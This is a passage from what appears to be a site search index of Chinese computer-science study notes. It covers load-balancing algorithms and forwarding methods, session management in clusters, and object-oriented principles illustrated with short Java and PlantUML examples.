![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/43d323ac-9f07-4e4a-a315-4eaf8c38766c.jpg" width="500px)`},{header:"4. \u52A0\u6743\u6700\u5C11\u8FDE\u63A5\uFF08Weighted Least Connection\uFF09",slug:"_4-\u52A0\u6743\u6700\u5C11\u8FDE\u63A5-weighted-least-connection",content:"\u5728\u6700\u5C11\u8FDE\u63A5\u7684\u57FA\u7840\u4E0A\uFF0C\u6839\u636E\u670D\u52A1\u5668\u7684\u6027\u80FD\u4E3A\u6BCF\u53F0\u670D\u52A1\u5668\u5206\u914D\u6743\u91CD\uFF0C\u518D\u6839\u636E\u6743\u91CD\u8BA1\u7B97\u51FA\u6BCF\u53F0\u670D\u52A1\u5668\u80FD\u5904\u7406\u7684\u8FDE\u63A5\u6570\u3002"},{header:"5. \u968F\u673A\u7B97\u6CD5\uFF08Random\uFF09",slug:"_5-\u968F\u673A\u7B97\u6CD5-random",content:`\u628A\u8BF7\u6C42\u968F\u673A\u53D1\u9001\u5230\u670D\u52A1\u5668\u4E0A\u3002
\u548C\u8F6E\u8BE2\u7B97\u6CD5\u7C7B\u4F3C\uFF0C\u8BE5\u7B97\u6CD5\u6BD4\u8F83\u9002\u5408\u670D\u52A1\u5668\u6027\u80FD\u5DEE\u4E0D\u591A\u7684\u573A\u666F\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a42ad3a7-3574-4c48-a783-ed3d08a0688a.jpg" width="500px)`},{header:"6. \u6E90\u5730\u5740\u54C8\u5E0C\u6CD5 (IP Hash)",slug:"_6-\u6E90\u5730\u5740\u54C8\u5E0C\u6CD5-ip-hash",content:`\u6E90\u5730\u5740\u54C8\u5E0C\u901A\u8FC7\u5BF9\u5BA2\u6237\u7AEF IP \u8BA1\u7B97\u54C8\u5E0C\u503C\u4E4B\u540E\uFF0C\u518D\u5BF9\u670D\u52A1\u5668\u6570\u91CF\u53D6\u6A21\u5F97\u5230\u76EE\u6807\u670D\u52A1\u5668\u7684\u5E8F\u53F7\u3002
\u53EF\u4EE5\u4FDD\u8BC1\u540C\u4E00 IP \u7684\u5BA2\u6237\u7AEF\u7684\u8BF7\u6C42\u4F1A\u8F6C\u53D1\u5230\u540C\u4E00\u53F0\u670D\u52A1\u5668\u4E0A\uFF0C\u7528\u6765\u5B9E\u73B0\u4F1A\u8BDD\u7C98\u6EDE\uFF08Sticky Session\uFF09
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0f399a9f-1351-4b2d-b8a4-2ebe82b1a703.jpg" width="500px)`},{header:"\u8F6C\u53D1\u5B9E\u73B0",slug:"\u8F6C\u53D1\u5B9E\u73B0",content:""},{header:"1. HTTP \u91CD\u5B9A\u5411",slug:"_1-http-\u91CD\u5B9A\u5411",content:`HTTP \u91CD\u5B9A\u5411\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\u4F7F\u7528\u67D0\u79CD\u8D1F\u8F7D\u5747\u8861\u7B97\u6CD5\u8BA1\u7B97\u5F97\u5230\u670D\u52A1\u5668\u7684 IP \u5730\u5740\u4E4B\u540E\uFF0C\u5C06\u8BE5\u5730\u5740\u5199\u5165 HTTP \u91CD\u5B9A\u5411\u62A5\u6587\u4E2D\uFF0C\u72B6\u6001\u7801\u4E3A 302\u3002\u5BA2\u6237\u7AEF\u6536\u5230\u91CD\u5B9A\u5411\u62A5\u6587\u4E4B\u540E\uFF0C\u9700\u8981\u91CD\u65B0\u5411\u670D\u52A1\u5668\u53D1\u8D77\u8BF7\u6C42\u3002
\u7F3A\u70B9\uFF1A \u9700\u8981\u4E24\u6B21\u8BF7\u6C42\uFF0C\u56E0\u6B64\u8BBF\u95EE\u5EF6\u8FDF\u6BD4\u8F83\u9AD8\uFF1B
HTTP \u8D1F\u8F7D\u5747\u8861\u5668\u5904\u7406\u80FD\u529B\u6709\u9650\uFF0C\u4F1A\u9650\u5236\u96C6\u7FA4\u7684\u89C4\u6A21\u3002 \u8BE5\u8D1F\u8F7D\u5747\u8861\u8F6C\u53D1\u7684\u7F3A\u70B9\u6BD4\u8F83\u660E\u663E\uFF0C\u5B9E\u9645\u573A\u666F\u4E2D\u5F88\u5C11\u4F7F\u7528\u5B83\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/02a1fbfd-7a9d-4114-95df-ca2445587a1f.jpg" width="500px)`},{header:"2. DNS \u57DF\u540D\u89E3\u6790",slug:"_2-dns-\u57DF\u540D\u89E3\u6790",content:`\u5728 DNS \u89E3\u6790\u57DF\u540D\u7684\u540C\u65F6\u4F7F\u7528\u8D1F\u8F7D\u5747\u8861\u7B97\u6CD5\u8BA1\u7B97\u670D\u52A1\u5668 IP \u5730\u5740\u3002
\u4F18\u70B9\uFF1A DNS \u80FD\u591F\u6839\u636E\u5730\u7406\u4F4D\u7F6E\u8FDB\u884C\u57DF\u540D\u89E3\u6790\uFF0C\u8FD4\u56DE\u79BB\u7528\u6237\u6700\u8FD1\u7684\u670D\u52A1\u5668 IP \u5730\u5740\u3002 \u7F3A\u70B9\uFF1A \u7531\u4E8E DNS \u5177\u6709\u591A\u7EA7\u7ED3\u6784\uFF0C\u6BCF\u4E00\u7EA7\u7684\u57DF\u540D\u8BB0\u5F55\u90FD\u53EF\u80FD\u88AB\u7F13\u5B58\uFF0C\u5F53\u4E0B\u7EBF\u4E00\u53F0\u670D\u52A1\u5668\u9700\u8981\u4FEE\u6539 DNS \u8BB0\u5F55\u65F6\uFF0C\u9700\u8981\u8FC7\u5F88\u957F\u4E00\u6BB5\u65F6\u95F4\u624D\u80FD\u751F\u6548\u3002 \u5927\u578B\u7F51\u7AD9\u57FA\u672C\u4F7F\u7528\u4E86 DNS \u505A\u4E3A\u7B2C\u4E00\u7EA7\u8D1F\u8F7D\u5747\u8861\u624B\u6BB5\uFF0C\u7136\u540E\u5728\u5185\u90E8\u4F7F\u7528\u5176\u5B83\u65B9\u5F0F\u505A\u7B2C\u4E8C\u7EA7\u8D1F\u8F7D\u5747\u8861\u3002\u4E5F\u5C31\u662F\u8BF4\uFF0C\u57DF\u540D\u89E3\u6790\u7684\u7ED3\u679C\u4E3A\u5185\u90E8\u7684\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668 IP \u5730\u5740\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d2c072cc-8b17-480c-813e-18cdb3b4b51f.jpg" width="500px)`},{header:"3. \u53CD\u5411\u4EE3\u7406\u670D\u52A1\u5668",slug:"_3-\u53CD\u5411\u4EE3\u7406\u670D\u52A1\u5668",content:`\u53CD\u5411\u4EE3\u7406\u670D\u52A1\u5668\u4F4D\u4E8E\u6E90\u670D\u52A1\u5668\u524D\u9762\uFF0C\u7528\u6237\u7684\u8BF7\u6C42\u9700\u8981\u5148\u7ECF\u8FC7\u53CD\u5411\u4EE3\u7406\u670D\u52A1\u5668\u624D\u80FD\u5230\u8FBE\u6E90\u670D\u52A1\u5668\u3002\u53CD\u5411\u4EE3\u7406\u53EF\u4EE5\u7528\u6765\u8FDB\u884C\u7F13\u5B58\u3001\u65E5\u5FD7\u8BB0\u5F55\u7B49\uFF0C\u540C\u65F6\u4E5F\u53EF\u4EE5\u7528\u6765\u505A\u4E3A\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\u3002
\u5728\u8FD9\u79CD\u8D1F\u8F7D\u5747\u8861\u8F6C\u53D1\u65B9\u5F0F\u4E0B\uFF0C\u5BA2\u6237\u7AEF\u4E0D\u76F4\u63A5\u8BF7\u6C42\u6E90\u670D\u52A1\u5668\uFF0C\u56E0\u6B64\u6E90\u670D\u52A1\u5668\u4E0D\u9700\u8981\u5916\u90E8 IP \u5730\u5740\uFF0C\u800C\u53CD\u5411\u4EE3\u7406\u9700\u8981\u914D\u7F6E\u5185\u90E8\u548C\u5916\u90E8\u4E24\u5957 IP \u5730\u5740\u3002
\u4F18\u70B9\uFF1A \u4E0E\u5176\u5B83\u529F\u80FD\u96C6\u6210\u5728\u4E00\u8D77\uFF0C\u90E8\u7F72\u7B80\u5355\u3002 \u7F3A\u70B9\uFF1A \u6240\u6709\u8BF7\u6C42\u548C\u54CD\u5E94\u90FD\u9700\u8981\u7ECF\u8FC7\u53CD\u5411\u4EE3\u7406\u670D\u52A1\u5668\uFF0C\u5B83\u53EF\u80FD\u4F1A\u6210\u4E3A\u6027\u80FD\u74F6\u9888\u3002`},{header:"4. \u7F51\u7EDC\u5C42",slug:"_4-\u7F51\u7EDC\u5C42",content:`\u5728\u64CD\u4F5C\u7CFB\u7EDF\u5185\u6838\u8FDB\u7A0B\u83B7\u53D6\u7F51\u7EDC\u6570\u636E\u5305\uFF0C\u6839\u636E\u8D1F\u8F7D\u5747\u8861\u7B97\u6CD5\u8BA1\u7B97\u6E90\u670D\u52A1\u5668\u7684 IP \u5730\u5740\uFF0C\u5E76\u4FEE\u6539\u8BF7\u6C42\u6570\u636E\u5305\u7684\u76EE\u7684 IP \u5730\u5740\uFF0C\u6700\u540E\u8FDB\u884C\u8F6C\u53D1\u3002
\u6E90\u670D\u52A1\u5668\u8FD4\u56DE\u7684\u54CD\u5E94\u4E5F\u9700\u8981\u7ECF\u8FC7\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\uFF0C\u901A\u5E38\u662F\u8BA9\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\u540C\u65F6\u4F5C\u4E3A\u96C6\u7FA4\u7684\u7F51\u5173\u670D\u52A1\u5668\u6765\u5B9E\u73B0\u3002
\u4F18\u70B9\uFF1A \u5728\u5185\u6838\u8FDB\u7A0B\u4E2D\u8FDB\u884C\u5904\u7406\uFF0C\u6027\u80FD\u6BD4\u8F83\u9AD8\u3002 \u7F3A\u70B9\uFF1A \u548C\u53CD\u5411\u4EE3\u7406\u4E00\u6837\uFF0C\u6240\u6709\u7684\u8BF7\u6C42\u548C\u54CD\u5E94\u90FD\u7ECF\u8FC7\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\uFF0C\u4F1A\u6210\u4E3A\u6027\u80FD\u74F6\u9888\u3002`},{header:"5. \u94FE\u8DEF\u5C42",slug:"_5-\u94FE\u8DEF\u5C42",content:`\u5728\u94FE\u8DEF\u5C42\u6839\u636E\u8D1F\u8F7D\u5747\u8861\u7B97\u6CD5\u8BA1\u7B97\u6E90\u670D\u52A1\u5668\u7684 MAC \u5730\u5740\uFF0C\u5E76\u4FEE\u6539\u8BF7\u6C42\u6570\u636E\u5305\u7684\u76EE\u7684 MAC \u5730\u5740\uFF0C\u5E76\u8FDB\u884C\u8F6C\u53D1\u3002
\u901A\u8FC7\u914D\u7F6E\u6E90\u670D\u52A1\u5668\u7684\u865A\u62DF IP \u5730\u5740\u548C\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\u7684 IP \u5730\u5740\u4E00\u81F4\uFF0C\u4ECE\u800C\u4E0D\u9700\u8981\u4FEE\u6539 IP \u5730\u5740\u5C31\u53EF\u4EE5\u8FDB\u884C\u8F6C\u53D1\u3002\u4E5F\u6B63\u56E0\u4E3A IP \u5730\u5740\u4E00\u6837\uFF0C\u6240\u4EE5\u6E90\u670D\u52A1\u5668\u7684\u54CD\u5E94\u4E0D\u9700\u8981\u8F6C\u53D1\u56DE\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\uFF0C\u53EF\u4EE5\u76F4\u63A5\u8F6C\u53D1\u7ED9\u5BA2\u6237\u7AEF\uFF0C\u907F\u514D\u4E86\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\u7684\u6210\u4E3A\u74F6\u9888\u3002
\u8FD9\u662F\u4E00\u79CD\u4E09\u89D2\u4F20\u8F93\u6A21\u5F0F\uFF0C\u88AB\u79F0\u4E3A\u76F4\u63A5\u8DEF\u7531\u3002\u5BF9\u4E8E\u63D0\u4F9B\u4E0B\u8F7D\u548C\u89C6\u9891\u670D\u52A1\u7684\u7F51\u7AD9\u6765\u8BF4\uFF0C\u76F4\u63A5\u8DEF\u7531\u907F\u514D\u4E86\u5927\u91CF\u7684\u7F51\u7EDC\u4F20\u8F93\u6570\u636E\u7ECF\u8FC7\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\u3002
\u8FD9\u662F\u76EE\u524D\u5927\u578B\u7F51\u7AD9\u4F7F\u7528\u6700\u5E7F\u8D1F\u8F7D\u5747\u8861\u8F6C\u53D1\u65B9\u5F0F\uFF0C\u5728 Linux \u5E73\u53F0\u53EF\u4EE5\u4F7F\u7528\u7684\u8D1F\u8F7D\u5747\u8861\u670D\u52A1\u5668\u4E3A LVS\uFF08Linux Virtual Server\uFF09\u3002
\u53C2\u8003\uFF1A Comparing Load Balancing Algorithms
Redirection and Load Balancing`},{header:"\u4E8C\u3001\u96C6\u7FA4\u4E0B\u7684 Session \u7BA1\u7406",slug:"\u4E8C\u3001\u96C6\u7FA4\u4E0B\u7684-session-\u7BA1\u7406",content:"\u4E00\u4E2A\u7528\u6237\u7684 Session \u4FE1\u606F\u5982\u679C\u5B58\u50A8\u5728\u4E00\u4E2A\u670D\u52A1\u5668\u4E0A\uFF0C\u90A3\u4E48\u5F53\u8D1F\u8F7D\u5747\u8861\u5668\u628A\u7528\u6237\u7684\u4E0B\u4E00\u4E2A\u8BF7\u6C42\u8F6C\u53D1\u5230\u53E6\u4E00\u4E2A\u670D\u52A1\u5668\uFF0C\u7531\u4E8E\u670D\u52A1\u5668\u6CA1\u6709\u7528\u6237\u7684 Session \u4FE1\u606F\uFF0C\u90A3\u4E48\u8BE5\u7528\u6237\u5C31\u9700\u8981\u91CD\u65B0\u8FDB\u884C\u767B\u5F55\u7B49\u64CD\u4F5C\u3002"},{header:"Sticky Session",slug:"sticky-session",content:`\u9700\u8981\u914D\u7F6E\u8D1F\u8F7D\u5747\u8861\u5668\uFF0C\u4F7F\u5F97\u4E00\u4E2A\u7528\u6237\u7684\u6240\u6709\u8BF7\u6C42\u90FD\u8DEF\u7531\u5230\u540C\u4E00\u4E2A\u670D\u52A1\u5668\uFF0C\u8FD9\u6837\u5C31\u53EF\u4EE5\u628A\u7528\u6237\u7684 Session \u5B58\u653E\u5728\u8BE5\u670D\u52A1\u5668\u4E2D\u3002
\u7F3A\u70B9\uFF1A \u5F53\u670D\u52A1\u5668\u5B95\u673A\u65F6\uFF0C\u5C06\u4E22\u5931\u8BE5\u670D\u52A1\u5668\u4E0A\u7684\u6240\u6709 Session\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1623f524-b011-40c8-b83f-eab38d538f76.png" width="400px)`},{header:"Session Replication",slug:"session-replication",content:`\u5728\u670D\u52A1\u5668\u4E4B\u95F4\u8FDB\u884C Session \u540C\u6B65\u64CD\u4F5C\uFF0C\u6BCF\u4E2A\u670D\u52A1\u5668\u90FD\u6709\u6240\u6709\u7528\u6237\u7684 Session \u4FE1\u606F\uFF0C\u56E0\u6B64\u7528\u6237\u53EF\u4EE5\u5411\u4EFB\u4F55\u4E00\u4E2A\u670D\u52A1\u5668\u8FDB\u884C\u8BF7\u6C42\u3002
\u7F3A\u70B9\uFF1A \u5360\u7528\u8FC7\u591A\u5185\u5B58\uFF1B
\u540C\u6B65\u8FC7\u7A0B\u5360\u7528\u7F51\u7EDC\u5E26\u5BBD\u4EE5\u53CA\u670D\u52A1\u5668\u5904\u7406\u5668\u65F6\u95F4\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/40c6570d-c1d7-4c38-843e-ba991b2328c2.png" width="400px)`},{header:"Session Server",slug:"session-server",content:`\u4F7F\u7528\u4E00\u4E2A\u5355\u72EC\u7684\u670D\u52A1\u5668\u5B58\u50A8 Session \u6570\u636E\uFF0C\u53EF\u4EE5\u4F7F\u7528\u4F20\u7EDF\u7684 MySQL\uFF0C\u4E5F\u4F7F\u7528 Redis \u6216\u8005 Memcached \u8FD9\u79CD\u5185\u5B58\u578B\u6570\u636E\u5E93\u3002
\u4F18\u70B9\uFF1A \u4E3A\u4E86\u4F7F\u5F97\u5927\u578B\u7F51\u7AD9\u5177\u6709\u4F38\u7F29\u6027\uFF0C\u96C6\u7FA4\u4E2D\u7684\u5E94\u7528\u670D\u52A1\u5668\u901A\u5E38\u9700\u8981\u4FDD\u6301\u65E0\u72B6\u6001\uFF0C\u90A3\u4E48\u5E94\u7528\u670D\u52A1\u5668\u4E0D\u80FD\u5B58\u50A8\u7528\u6237\u7684\u4F1A\u8BDD\u4FE1\u606F\u3002Session Server \u5C06\u7528\u6237\u7684\u4F1A\u8BDD\u4FE1\u606F\u5355\u72EC\u8FDB\u884C\u5B58\u50A8\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u4E86\u5E94\u7528\u670D\u52A1\u5668\u7684\u65E0\u72B6\u6001\u3002 \u7F3A\u70B9\uFF1A \u9700\u8981\u53BB\u5B9E\u73B0\u5B58\u53D6 Session \u7684\u4EE3\u7801\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fdc45a09-f838-4348-8959-d2c793727788.png" width="600px)
\u53C2\u8003\uFF1A Session Management using Spring Session with JDBC DataStore`}]},{path:"/java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.html",title:"\u9762\u5411\u5BF9\u8C61\u601D\u60F3",pathLocale:"/",contents:[{header:"\u9762\u5411\u5BF9\u8C61\u601D\u60F3",slug:"\u9762\u5411\u5BF9\u8C61\u601D\u60F3",content:`\u9762\u5411\u5BF9\u8C61\u601D\u60F3 \u4E00\u3001\u4E09\u5927\u7279\u6027 \u5C01\u88C5
\u7EE7\u627F
\u591A\u6001 \u4E8C\u3001\u7C7B\u56FE \u6CDB\u5316\u5173\u7CFB (Generalization)
\u5B9E\u73B0\u5173\u7CFB (Realization)
\u805A\u5408\u5173\u7CFB (Aggregation)
\u7EC4\u5408\u5173\u7CFB (Composition)
\u5173\u8054\u5173\u7CFB (Association)
\u4F9D\u8D56\u5173\u7CFB (Dependency) \u4E09\u3001\u8BBE\u8BA1\u539F\u5219 S.O.L.I.D 1. \u5355\u4E00\u8D23\u4EFB\u539F\u5219
2. \u5F00\u653E\u5C01\u95ED\u539F\u5219
3. \u91CC\u6C0F\u66FF\u6362\u539F\u5219
4. \u63A5\u53E3\u5206\u79BB\u539F\u5219
5. \u4F9D\u8D56\u5012\u7F6E\u539F\u5219 \u5176\u4ED6\u5E38\u89C1\u539F\u5219 1. \u8FEA\u7C73\u7279\u6CD5\u5219
2. \u5408\u6210\u590D\u7528\u539F\u5219
3. \u5171\u540C\u5C01\u95ED\u539F\u5219
4. \u7A33\u5B9A\u62BD\u8C61\u539F\u5219
5. \u7A33\u5B9A\u4F9D\u8D56\u539F\u5219 \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u4E09\u5927\u7279\u6027",slug:"\u4E00\u3001\u4E09\u5927\u7279\u6027",content:""},{header:"\u5C01\u88C5",slug:"\u5C01\u88C5",content:`\u5229\u7528\u62BD\u8C61\u6570\u636E\u7C7B\u578B\u5C06\u6570\u636E\u548C\u57FA\u4E8E\u6570\u636E\u7684\u64CD\u4F5C\u5C01\u88C5\u5728\u4E00\u8D77\uFF0C\u4F7F\u5176\u6784\u6210\u4E00\u4E2A\u4E0D\u53EF\u5206\u5272\u7684\u72EC\u7ACB\u5B9E\u4F53\u3002\u6570\u636E\u88AB\u4FDD\u62A4\u5728\u62BD\u8C61\u6570\u636E\u7C7B\u578B\u7684\u5185\u90E8\uFF0C\u5C3D\u53EF\u80FD\u5730\u9690\u85CF\u5185\u90E8\u7684\u7EC6\u8282\uFF0C\u53EA\u4FDD\u7559\u4E00\u4E9B\u5BF9\u5916\u7684\u63A5\u53E3\u4F7F\u5176\u4E0E\u5916\u90E8\u53D1\u751F\u8054\u7CFB\u3002\u7528\u6237\u65E0\u9700\u5173\u5FC3\u5BF9\u8C61\u5185\u90E8\u7684\u7EC6\u8282\uFF0C\u4F46\u53EF\u4EE5\u901A\u8FC7\u5BF9\u8C61\u5BF9\u5916\u63D0\u4F9B\u7684\u63A5\u53E3\u6765\u8BBF\u95EE\u8BE5\u5BF9\u8C61\u3002
\u4F18\u70B9\uFF1A \u51CF\u5C11\u8026\u5408\uFF1A\u53EF\u4EE5\u72EC\u7ACB\u5730\u5F00\u53D1\u3001\u6D4B\u8BD5\u3001\u4F18\u5316\u3001\u4F7F\u7528\u3001\u7406\u89E3\u548C\u4FEE\u6539
\u51CF\u8F7B\u7EF4\u62A4\u7684\u8D1F\u62C5\uFF1A\u53EF\u4EE5\u66F4\u5BB9\u6613\u88AB\u7406\u89E3\uFF0C\u5E76\u4E14\u5728\u8C03\u8BD5\u7684\u65F6\u5019\u53EF\u4EE5\u4E0D\u5F71\u54CD\u5176\u4ED6\u6A21\u5757
\u6709\u6548\u5730\u8C03\u8282\u6027\u80FD\uFF1A\u53EF\u4EE5\u901A\u8FC7\u5256\u6790\u6765\u786E\u5B9A\u54EA\u4E9B\u6A21\u5757\u5F71\u54CD\u4E86\u7CFB\u7EDF\u7684\u6027\u80FD
\u63D0\u9AD8\u8F6F\u4EF6\u7684\u53EF\u91CD\u7528\u6027
\u964D\u4F4E\u4E86\u6784\u5EFA\u5927\u578B\u7CFB\u7EDF\u7684\u98CE\u9669\uFF1A\u5373\u4F7F\u6574\u4E2A\u7CFB\u7EDF\u4E0D\u53EF\u7528\uFF0C\u4F46\u662F\u8FD9\u4E9B\u72EC\u7ACB\u7684\u6A21\u5757\u5374\u6709\u53EF\u80FD\u662F\u53EF\u7528\u7684 \u4EE5\u4E0B Person \u7C7B\u5C01\u88C5 name\u3001gender\u3001age \u7B49\u5C5E\u6027\uFF0C\u5916\u754C\u53EA\u80FD\u901A\u8FC7 get() \u65B9\u6CD5\u83B7\u53D6\u4E00\u4E2A Person \u5BF9\u8C61\u7684 name \u5C5E\u6027\u548C gender \u5C5E\u6027\uFF0C\u800C\u65E0\u6CD5\u83B7\u53D6 age \u5C5E\u6027\uFF0C\u4F46\u662F age \u5C5E\u6027\u53EF\u4EE5\u4F9B work() \u65B9\u6CD5\u4F7F\u7528\u3002
\u6CE8\u610F\u5230 gender \u5C5E\u6027\u4F7F\u7528 int \u6570\u636E\u7C7B\u578B\u8FDB\u884C\u5B58\u50A8\uFF0C\u5C01\u88C5\u4F7F\u5F97\u7528\u6237\u6CE8\u610F\u4E0D\u5230\u8FD9\u79CD\u5B9E\u73B0\u7EC6\u8282\u3002\u5E76\u4E14\u5728\u9700\u8981\u4FEE\u6539 gender \u5C5E\u6027\u4F7F\u7528\u7684\u6570\u636E\u7C7B\u578B\u65F6\uFF0C\u4E5F\u53EF\u4EE5\u5728\u4E0D\u5F71\u54CD\u5BA2\u6237\u7AEF\u4EE3\u7801\u7684\u60C5\u51B5\u4E0B\u8FDB\u884C\u3002
public class Person { private String name; private int gender; private int age; public String getName() { return name; } public String getGender() { return gender == 0 ? "man" : "woman"; } public void work() { if (18 <= age && age <= 50) { System.out.println(name + " is working very hard!"); } else { System.out.println(name + " can't work any more!"); } }
}`},{header:"\u7EE7\u627F",slug:"\u7EE7\u627F",content:`\u7EE7\u627F\u5B9E\u73B0\u4E86 IS-A \u5173\u7CFB\uFF0C\u4F8B\u5982 Cat \u548C Animal \u5C31\u662F\u4E00\u79CD IS-A \u5173\u7CFB\uFF0C\u56E0\u6B64 Cat \u53EF\u4EE5\u7EE7\u627F\u81EA Animal\uFF0C\u4ECE\u800C\u83B7\u5F97 Animal \u975E private \u7684\u5C5E\u6027\u548C\u65B9\u6CD5\u3002
\u7EE7\u627F\u5E94\u8BE5\u9075\u5FAA\u91CC\u6C0F\u66FF\u6362\u539F\u5219\uFF0C\u5B50\u7C7B\u5BF9\u8C61\u5FC5\u987B\u80FD\u591F\u66FF\u6362\u6389\u6240\u6709\u7236\u7C7B\u5BF9\u8C61\u3002
Cat \u53EF\u4EE5\u5F53\u505A Animal \u6765\u4F7F\u7528\uFF0C\u4E5F\u5C31\u662F\u8BF4\u53EF\u4EE5\u4F7F\u7528 Animal \u5F15\u7528 Cat \u5BF9\u8C61\u3002\u7236\u7C7B\u5F15\u7528\u6307\u5411\u5B50\u7C7B\u5BF9\u8C61\u79F0\u4E3A \u5411\u4E0A\u8F6C\u578B \u3002
Animal animal = new Cat();`},{header:"\u591A\u6001",slug:"\u591A\u6001",content:`\u591A\u6001\u5206\u4E3A\u7F16\u8BD1\u65F6\u591A\u6001\u548C\u8FD0\u884C\u65F6\u591A\u6001\uFF1A \u7F16\u8BD1\u65F6\u591A\u6001\u4E3B\u8981\u6307\u65B9\u6CD5\u7684\u91CD\u8F7D
\u8FD0\u884C\u65F6\u591A\u6001\u6307\u7A0B\u5E8F\u4E2D\u5B9A\u4E49\u7684\u5BF9\u8C61\u5F15\u7528\u6240\u6307\u5411\u7684\u5177\u4F53\u7C7B\u578B\u5728\u8FD0\u884C\u671F\u95F4\u624D\u786E\u5B9A \u8FD0\u884C\u65F6\u591A\u6001\u6709\u4E09\u4E2A\u6761\u4EF6\uFF1A \u7EE7\u627F
\u8986\u76D6\uFF08\u91CD\u5199\uFF09
\u5411\u4E0A\u8F6C\u578B \u4E0B\u9762\u7684\u4EE3\u7801\u4E2D\uFF0C\u4E50\u5668\u7C7B\uFF08Instrument\uFF09\u6709\u4E24\u4E2A\u5B50\u7C7B\uFF1AWind \u548C Percussion\uFF0C\u5B83\u4EEC\u90FD\u8986\u76D6\u4E86\u7236\u7C7B\u7684 play() \u65B9\u6CD5\uFF0C\u5E76\u4E14\u5728 main() \u65B9\u6CD5\u4E2D\u4F7F\u7528\u7236\u7C7B Instrument \u6765\u5F15\u7528 Wind \u548C Percussion \u5BF9\u8C61\u3002\u5728 Instrument \u5F15\u7528\u8C03\u7528 play() \u65B9\u6CD5\u65F6\uFF0C\u4F1A\u6267\u884C\u5B9E\u9645\u5F15\u7528\u5BF9\u8C61\u6240\u5728\u7C7B\u7684 play() \u65B9\u6CD5\uFF0C\u800C\u4E0D\u662F Instrument \u7C7B\u7684\u65B9\u6CD5\u3002
public class Instrument { public void play() { System.out.println("Instument is playing..."); }
}
public class Wind extends Instrument { public void play() { System.out.println("Wind is playing..."); }
}
public class Percussion extends Instrument { public void play() { System.out.println("Percussion is playing..."); }
}
public class Music { public static void main(String[] args) { List<Instrument> instruments = new ArrayList<>(); instruments.add(new Wind()); instruments.add(new Percussion()); for(Instrument instrument : instruments) { instrument.play(); } }
}
Wind is playing...
Percussion is playing...`},{header:"\u4E8C\u3001\u7C7B\u56FE",slug:"\u4E8C\u3001\u7C7B\u56FE",content:"\u4EE5\u4E0B\u7C7B\u56FE\u4F7F\u7528 PlantUML \u7ED8\u5236\uFF0C\u66F4\u591A\u8BED\u6CD5\u53CA\u4F7F\u7528\u8BF7\u53C2\u8003\uFF1Ahttp://plantuml.com/ \u3002"},{header:"\u6CDB\u5316\u5173\u7CFB (Generalization)",slug:"\u6CDB\u5316\u5173\u7CFB-generalization",content:`\u7528\u6765\u63CF\u8FF0\u7EE7\u627F\u5173\u7CFB\uFF0C\u5728 Java \u4E2D\u4F7F\u7528 extends \u5173\u952E\u5B57\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0874e0a-dba3-467e-9c86-dd9313e0843e.jpg" width="180px">
@startuml title Generalization class Vihical
class Car
class Trunck Vihical <|-- Car
Vihical <|-- Trunck @enduml`},{header:"\u5B9E\u73B0\u5173\u7CFB (Realization)",slug:"\u5B9E\u73B0\u5173\u7CFB-realization",content:`\u7528\u6765\u5B9E\u73B0\u4E00\u4E2A\u63A5\u53E3\uFF0C\u5728 Java \u4E2D\u4F7F\u7528 implements \u5173\u952E\u5B57\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/83d466bd-946b-4430-854a-cf7b0696d4c8.jpg" width="170px">
@startuml title Realization interface MoveBehavior
class Fly
class Run MoveBehavior <|.. Fly
MoveBehavior <|.. Run @enduml`},{header:"\u805A\u5408\u5173\u7CFB (Aggregation)",slug:"\u805A\u5408\u5173\u7CFB-aggregation",content:`\u8868\u793A\u6574\u4F53\u7531\u90E8\u5206\u7EC4\u6210\uFF0C\u4F46\u662F\u6574\u4F53\u548C\u90E8\u5206\u4E0D\u662F\u5F3A\u4F9D\u8D56\u7684\uFF0C\u6574\u4F53\u4E0D\u5B58\u5728\u4E86\u90E8\u5206\u8FD8\u662F\u4F1A\u5B58\u5728\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a0ce43b7-afa8-4397-a96e-5c12a070f2ae.jpg" width="300px">
@startuml title Aggregation class Computer
class Keyboard
class Mouse
class Screen Computer o-- Keyboard
Computer o-- Mouse
Computer o-- Screen @enduml`},{header:"\u7EC4\u5408\u5173\u7CFB (Composition)",slug:"\u7EC4\u5408\u5173\u7CFB-composition",content:`\u548C\u805A\u5408\u4E0D\u540C\uFF0C\u7EC4\u5408\u4E2D\u6574\u4F53\u548C\u90E8\u5206\u662F\u5F3A\u4F9D\u8D56\u7684\uFF0C\u6574\u4F53\u4E0D\u5B58\u5728\u4E86\u90E8\u5206\u4E5F\u4E0D\u5B58\u5728\u4E86\u3002\u6BD4\u5982\u516C\u53F8\u548C\u90E8\u95E8\uFF0C\u516C\u53F8\u6CA1\u4E86\u90E8\u95E8\u5C31\u4E0D\u5B58\u5728\u4E86\u3002\u4F46\u662F\u516C\u53F8\u548C\u5458\u5DE5\u5C31\u5C5E\u4E8E\u805A\u5408\u5173\u7CFB\u4E86\uFF0C\u56E0\u4E3A\u516C\u53F8\u6CA1\u4E86\u5458\u5DE5\u8FD8\u5728\u3002
